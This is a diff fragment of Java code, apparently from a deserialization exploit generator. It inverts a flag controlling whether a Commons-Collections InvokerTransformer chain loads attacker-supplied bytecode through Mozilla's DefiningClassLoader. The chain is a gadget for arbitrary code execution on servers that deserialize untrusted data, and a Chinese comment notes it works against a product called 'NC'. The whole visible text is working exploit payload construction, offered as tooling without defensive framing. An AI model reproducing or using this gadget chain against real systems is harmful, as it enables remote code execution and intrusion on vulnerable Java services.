@@ -59,7 +59,7 @@ public class TransformerUtil {
         } else if (command.startsWith("EX-") || command.startsWith("LF-")) {
             CtClass ctClass = generateClass(command);
 
-            if (!USING_MOZILLA_DEFININGCLASSLOADER) {
+            if (USING_MOZILLA_DEFININGCLASSLOADER) {
                 // 使用 DefiningClassLoader 加载，不是所有 JDK 均有 org.mozilla.javascript.DefiningClassLoader
                 // 在 NC 中可以使用
                 transformers = new Transformer[]{new ConstantTransformer(org.mozilla.javascript.DefiningClassLoader.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}), new InvokerTransformer("defineClass", new Class[]{String.class, byte[].class}, new Object[]{ctClass.getName(), ctClass.toBytecode()}), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new ConstantTransformer(1)};
